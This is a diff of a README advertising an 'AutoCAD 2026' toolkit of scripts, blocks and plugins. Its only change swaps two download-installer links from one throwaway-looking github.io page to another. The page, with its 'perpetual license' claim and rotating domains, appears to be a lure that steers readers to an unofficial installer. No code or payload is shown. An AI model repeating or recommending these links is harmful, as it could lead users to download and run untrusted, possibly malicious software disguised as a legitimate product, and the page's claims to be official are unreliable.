@@ -2,7 +2,7 @@
 
 Elevate your AutoCAD 2026 experience with this meticulously curated toolkit. This package bundles powerful automation scripts, a vast library of ready-to-use blocks, and essential plugins designed to supercharge your productivity in drafting, modeling, and annotation. It is the definitive resource for professionals seeking to streamline their AutoCAD workflow on Windows 10 and Windows 11.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside
 
@@ -56,7 +56,7 @@ A4: Yes, absolutely. You are granted a perpetual license to use all materials in
 
 Access the installer and detailed release notes from our official page.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
